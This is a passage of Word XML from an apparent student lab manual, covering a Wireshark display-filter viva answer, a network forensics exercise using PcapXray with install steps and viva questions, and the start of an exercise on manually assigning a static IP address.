    <w:p w14:paraId="48DB05D6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. What is a display filter in Wireshark?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157BD11D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A display filter is used to view specific packets from the captured data without affecting the original capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A120E5D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31BDF4E8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F692A11" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ACA5892" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="607FBA72" w14:textId="41704315" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Ex.No:13                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F209350" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>NETWORK FORENSICS USING PCAPXRAY TOOL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC02D1E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>AIM:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8FB58F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To analyze a PCAP file using PcapXray and visualize network activity for basic network forensic investigation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06350ABD" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>ALGORITHM:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE9BBB1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Install PcapXray dependencies using: sudo pip3 install -r requirements.txt2. Launch the tool with: sudo python3 PcapXray.py3. Open the web interface and upload the given PCAP file.4. Click Analyze to process the packet data.5. View the generated network topology and communication graph.6. Examine hosts, protocols, and suspicious connections.7. Save the generated report and diagrams for documentation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D256A3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70525CD1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6511E347" wp14:editId="7A48FA53">
            <wp:extent cx="5731510" cy="213265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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2132655"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="22BFA135" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5CB832B1" wp14:editId="217DA9E9">
            <wp:extent cx="5731509" cy="1402728"/>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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731509" cy="1402728"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C983BA8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="673567DB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6CEC21EA" wp14:editId="39DDF8C8">
            <wp:extent cx="5357067" cy="2932423"/>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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5357067" cy="2932423"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DE35DF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="139DE45B" wp14:editId="2B4E266A">
            <wp:extent cx="5433203" cy="1603968"/>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4"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5433203" cy="1603968"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C5626A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7024828D" wp14:editId="43B15774">
            <wp:extent cx="5388819" cy="2155528"/>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5"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5388819" cy="2155528"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="505D2B0A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0574DD47" wp14:editId="6F59A1FD">
            <wp:extent cx="5432789" cy="1635542"/>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6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5432789" cy="1635542"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2148F0C2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0648F8F4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5CA865C3" wp14:editId="4354D79C">
            <wp:extent cx="5731509" cy="1123452"/>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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731509" cy="1123452"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="38835E24" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="28E0597C" wp14:editId="41D5AD68">
            <wp:extent cx="5731509" cy="3116468"/>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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731509" cy="3116468"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2181A41D" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00473FAE" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22BF5915" w14:textId="0280C7E7" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>RESULT:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C9317B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Network forensics was successfully carried out using PcapXray, and the tool visualized hosts, protocols, and communication flows from the provided PCAP file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC49E09" w14:textId="086CC442" w:rsidR="00812B48" w:rsidRPr="00812B48" w:rsidRDefault="00000000" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="753127B7" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26AB0008" w14:textId="7759DF13" w:rsidR="00812B48" w:rsidRPr="00812B48" w:rsidRDefault="00812B48" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Viva Questions :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33594C27" w14:textId="0FB487A6" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is network forensics?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03CB5342" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Network forensics is the process of capturing, monitoring, and analyzing network traffic to investigate security incidents and collect digital evidence.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A45AB59" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. What is PcapXray?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DCB3ACA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:PcapXray is a network forensic tool used to visualize and analyze packet capture (PCAP) files to understand network activities and detect suspicious behavior.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089B3FD6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. What is a PCAP file?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46ECB029" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A PCAP (Packet Capture) file stores network packets captured from a network interface for later analysis.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012EF050" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Why is network traffic analysis important in digital forensics?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C5D142" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Network traffic analysis helps investigators identify cyberattacks, trace malicious activities, recover evidence, and understand communication between systems.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF97A30" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. What information can be obtained from a PCAP file?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D16507" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A PCAP file can provide information such as source and destination IP addresses, protocols used, timestamps, ports, and transmitted data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1DAA1D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE6BCFF" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7913FBF0" w14:textId="60EF719F" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Ex.No:14                                            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EB52B7D" w14:textId="0581B30D" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>LEARNING AND ASSIGNMENT OF IP ADDRESS MANUALLY TO</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57521348" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>COMPUTERS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02BA85D4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>AIM:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48ACD33B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To manually assign a static IPv4 address to a computer and verify network connectivity using subnet mask, default gateway, and DNS configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293067A3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>INTRODUCTION:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4104A398" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>In a computer network, devices can obtain IP addresses either automatically through DHCP or manually through static assignment.Static IP assignment is used in labs, servers, and controlled networks where fixed addressing is required.By configuring the IP address, subnet mask, default gateway, and DNS manually, we ensure the system correctly communicates within the LAN and accesses external networks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A04CDB7" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ALGORITHM:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A49EEC1" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Open Control Panel → Network and Sharing Center.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18830420" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
